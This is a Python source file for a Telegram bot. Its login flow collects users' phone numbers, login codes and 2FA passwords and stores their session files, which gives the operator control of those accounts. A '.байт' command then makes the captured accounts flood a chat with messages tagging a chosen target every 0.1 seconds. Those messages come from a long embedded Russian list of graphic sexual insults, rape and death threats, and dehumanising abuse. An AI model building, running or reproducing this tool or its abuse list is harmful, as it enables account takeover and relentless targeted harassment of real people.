import asyncio
import os
import re
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError, SessionPasswordNeededError
from telethon.tl.custom import Button

API_ID = 39163151
API_HASH = '3c0e92ad7b268eca1eb1a33a9baa7d1d'
BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')

SESSION_DIR = "sessions"
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

user_states = {}
user_temp = {}
user_clients = {}

bot_client = TelegramClient(
    os.path.join(SESSION_DIR, 'bot_session'),
    API_ID,
    API_HASH
).start(bot_token=BOT_TOKEN)

active_attacks = {}

lines_list = [
"я твою мать ебал", "я твою мать ебал в жопу", "я твою мать ебал в рот",
"я твою мать ебал в глотку", "я твою мать ебал в пизду", "я твою мать ебал в анал",
"я твою мать ебал до крови", "я твою мать ебал до гноя", "я твою мать ебал до мяса",
"я твою мать ебал до костей", "я твою мать ебал до кишок", "я твою мать ебал до рвоты",
"я твою мать ебал до судорог", "я твою мать ебал до агонии", "я твою мать ебал до потери сознания",
"я твою мать ебал до клинической смерти", "я твою мать ебал до остановки сердца",
"я твою мать ебал до паралича", "я твою мать ебал до инвалидности",
"я твою мать ебал пока она не захлебнулась", "я твою мать ебал пока она не кончила",
"я твою мать ебал пока она не вырубилась", "я твою мать ебал пока у нее матка не выпала",
"я твою мать ебал пока кишки не повылазили", "я твою мать ебал шлангом", "я твою мать ебал ломом",
"я твою мать ебал арматурой", "я твою мать ебал кувалдой", "я твою мать ебал бутылкой",
"я твою мать ебал ручкой швабры", "я твою мать ебал черенком лопаты", "я твою мать ебал ножкой табурета",
"я твою мать ебал в подворотне", "я твою мать ебал в сортире", "я твою мать ебал у помойки",
"я твою мать ебал на свалке", "я твою мать ебал в морге", "я твою мать ебал в канализации",
"я твою мать ебал в выгребной яме", "я твою мать ебал на вокзале", "я твою мать ебал в ночлежке",
"я твою мать ебал за копейки", "я твою мать ебал за дозу", "я твою мать ебал за спайс",
"я твою мать ебал за фен", "я твою мать ебал за опий", "я твою мать ебал за глоток спермы",
"я твою мать ебал за удар членом по лицу", "я твою мать драл", "я твою мать топтал",
"я твою мать швырял", "я твою мать ломил", "я твою мать насиловал", "я твою мать кромсал",
"я твою мать петушил", "я твою мать уничтожал", "я твою мать распластывал", "я твою мать рвал",
"я твою мать жевал", "я твою мать давил", "я твою мать терзал", "я твою мать калечил",
"я твою мать распинал", "я твою мать четвертовал", "я твою мать расчленял", "я твою мать вешал",
"я твою мать травил кислотой", "я твою мать сжигал заживо", "я твою мать закапывал в землю",
"я твою мать сбрасывал с крыши", "я твою мать переезжал машиной", "я твою мать резал на куски",
"я твою мать в бетон заливал", "твоя мать шалава", "твоя мать блядина", "твоя мать падаль",
"твоя мать мусорная яма", "твоя мать гнойная рана", "твоя мать сифилитичная дыра",
"твоя мать трипперная вонь", "твоя мать гонорейная пустышка", "твоя мать конченая скотина",
"твоя мать проститутка вокзальная", "твоя мать наркоманка подзаборная", "твоя мать бомжиха сортирная",
"твоя мать сосет у параши", "твоя мать лижет у помойки", "твоя мать глотает в подворотне",
"твоя мать обсасывает в сортире", "твоя мать вылизывает в канализации", "твоя мать заглатывает за спайс",
"твоя мать отсасывает за копейки", "твоя мать дрочит на вокзале", "твоя мать мастурбирует в ночлежке",
"твоя мать кончает под забором", "ты гнойный мешок", "ты недоносок", "ты выкидыш",
"ты ссанье подзаборное", "ты фекальная масса", "ты мокрота из мамкиной матки", "ты спермотоксикоз",
"ты отребье человеческое", "ты гниющий труп", "ты биомусор", "ты ублюдок конченый",
"ты мразь ебанная", "ты тварь дрожащая", "ты гнида вшивая", "ты пиздюк петушиный",
"ты ссыкло безъяйцевое", "ты импотент хуев", "ты даже стоять не можешь", "ты даже на коленях говно",
"ты трясешься как заяц перед удавом", "ты боишься собственной тени", "ты хуже любой шалавы",
"ты хуже любой бляди", "ты хуже помойной крысы", "ты даже на органы не годен",
"твоя мать родила тебя в сортире и хотела смыть, но ты уцепился за унитаз",
"ты вырос мокротой на трубе", "ты не человек а ошибка природы", "ты не заслужил ни жизни ни смерти",
"тебя даже ад не примет", "тебя даже черви жрут с брезгливостью", "ты пустое место",
"ты ноль без палки", "ты даже хуже нуля", "я ломал твои ребра об асфальт",
"я выбивал твои зубы о бордюр", "я проламывал твой череп о стену", "я вырывал твой язык об унитаз",
"я отрубал твои пальцы о край мусорного бака", "я раздроблял твои колени о канализационный люк",
"я выкалывал твои глаза ломом", "я сломал твою челюсть кирпичом", "я перебил тебе позвоночник трубой",
"я разорвал тебе сухожилия арматурой", "я сжег твою морду кислотой", "я отрезал тебе уши ножом",
"я расплющил твои ребра кувалдой", "я вывернул тебе суставы", "я забил твою глотку грязью",
"я засунул твою башку в унитаз и спустил воду", "я твою рожу об асфальт тер", "я твои кости собакам скормил",
"я твое тело в выгребную яму скинул", "а ты даже не рыпнулся", "а ты даже не пискнул",
"а ты даже мать не защитил", "ты просто смотрел как ее трахают", "ты лизал пол пока мать работала",
"ты стоял в углу и дрочил", "ты кончал в штаны от страха", "ты обоссался когда я на тебя посмотрел",
"ты обосрался когда я кашлянул", "ты ссыкло конченое с детства", "ты тряпка без воли",
"ты мешок без яиц", "ты кусок дерьма в человеческой оболочке", "ты даже ответить ничего не сможешь",
"ты проглотишь язык и будешь молчать", "потому что ты никто", "потому что ты ничто",
"потому что ты пустота", "я твой бог", "я твой господин", "я твой повелитель", "я твой палач",
"я твой судья", "я твоя смерть", "я тот кто пришел за тобой", "я тот кто сломает тебя",
"я тот кто сотрет тебя в порошок", "я тот кто выжжет тебя из памяти",
"я тот кто сделает так что никто не вспомнит твое имя", "ты умрешь в грязи", "ты сдохнешь под забором",
"ты захлебнешься собственной рвотой", "ты подавишься собственным языком", "ты изойдешь кровью из жопы",
"ты сгниешь заживо", "тебя сожрут черви", "тебя разложат бактерии", "тебя размажут по асфальту",
"ты даже памяти о себе не оставишь", "ты даже могилы не заслужишь", "тебя похоронят в выгребной яме",
"тебя закопают на свалке", "тебя скинут в канаву", "ты будешь лежать гнить пока крысы не выедят тебе глаза",
"и никто не придет", "никто не всплакнет", "никто не вспомнит", "потому что ты никто и звать тебя никак"
]

async def create_user_client(user_id):
    session_path = os.path.join(SESSION_DIR, f'user_{user_id}')
    return TelegramClient(session_path, API_ID, API_HASH)

async def send_code(client, phone):
    await client.connect()
    return await client.send_code_request(phone)

@bot_client.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    text = event.raw_text.strip()
    chat_id = event.chat_id

    if text == '/start':
        buttons = [[Button.request_phone("📱 Поделиться номером", resize=True)]]
        await event.reply(
            "🔐 Нажми кнопку и подтверди отправку номера",
            buttons=buttons
        )
        return

    if event.contact:
        phone = event.contact.phone_number
        if not phone:
            await event.reply("❌ Не удалось получить номер")
            return

        client = await create_user_client(user_id)
        try:
            result = await send_code(client, phone)
            user_temp[user_id] = {
                'phone': phone,
                'phone_code_hash': result.phone_code_hash,
                'client': client
            }
            user_states[user_id] = 'awaiting_code'
            await event.reply("✅ Код отправлен! Введи его в чат:")
        except FloodWaitError as e:
            await event.reply(f"❌ Жди {e.seconds} секунд")
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}")
        return

    if user_id in user_states and user_states[user_id] == 'awaiting_code':
        code = text.strip()
        temp = user_temp.get(user_id)
        if not temp:
            await event.reply("❌ Ошибка, попробуй /start заново")
            del user_states[user_id]
            return

        try:
            await temp['client'].sign_in(
                phone=temp['phone'],
                code=code,
                phone_code_hash=temp['phone_code_hash']
            )
            user_clients[user_id] = temp['client']
            del user_states[user_id]
            del user_temp[user_id]
            await event.reply("✅ Авторизация успешна!\n\n.байт @username\n.байтстоп @username")
        except SessionPasswordNeededError:
            user_states[user_id] = 'awaiting_password'
            await event.reply("🔐 Введи пароль от аккаунта (2FA):")
        except FloodWaitError as e:
            await event.reply(f"❌ Жди {e.seconds} секунд")
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}")
            del user_states[user_id]
        return

    if user_id in user_states and user_states[user_id] == 'awaiting_password':
        password = text.strip()
        temp = user_temp.get(user_id)
        if not temp:
            await event.reply("❌ Ошибка, попробуй /start заново")
            del user_states[user_id]
            return

        try:
            await temp['client'].sign_in(password=password)
            user_clients[user_id] = temp['client']
            del user_states[user_id]
            del user_temp[user_id]
            await event.reply("✅ Авторизация успешна!\n\n.байт @username\n.байтстоп @username")
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}")
        return

    if text.startswith('.байт '):
        if user_id not in user_clients:
            await event.reply("❌ Сначала авторизуйся: /start")
            return

        parts = text.split()
        if len(parts) < 2:
            await event.reply("❌ .байт @username")
            return

        target = parts[1].replace('@', '')
        key = f"{user_id}_{target}"

        if key in active_attacks:
            await event.delete()
            return

        stop_event = asyncio.Event()

        async def attack_loop():
            client = user_clients[user_id]
            while not stop_event.is_set():
                for line in lines_list:
                    if stop_event.is_set():
                        break
                    msg = f'@{target} {line}'
                    try:
                        await client.send_message(chat_id, msg)
                        await asyncio.sleep(0.1)
                    except FloodWaitError as e:
                        await asyncio.sleep(e.seconds)
                    except:
                        pass
                await asyncio.sleep(0.1)

        task = asyncio.create_task(attack_loop())
        active_attacks[key] = {'task': task, 'stop': stop_event}
        await event.delete()
        return

    if text.startswith('.байтстоп '):
        parts = text.split()
        if len(parts) < 2:
            await event.reply("❌ .байтстоп @username")
            return

        target = parts[1].replace('@', '')
        key = f"{user_id}_{target}"

        if key in active_attacks:
            active_attacks[key]['stop'].set()
            active_attacks[key]['task'].cancel()
            del active_attacks[key]

        await event.delete()
        return

async def main():
    await bot_client.start()
    me = await bot_client.get_me()
    print(f'✅ Бот: @{me.username}')
    print(f'📁 Сессии сохраняются в папку: {SESSION_DIR}')
    await bot_client.run_until_disconnected()

with bot_client:
    bot_client.loop.run_until_complete(main())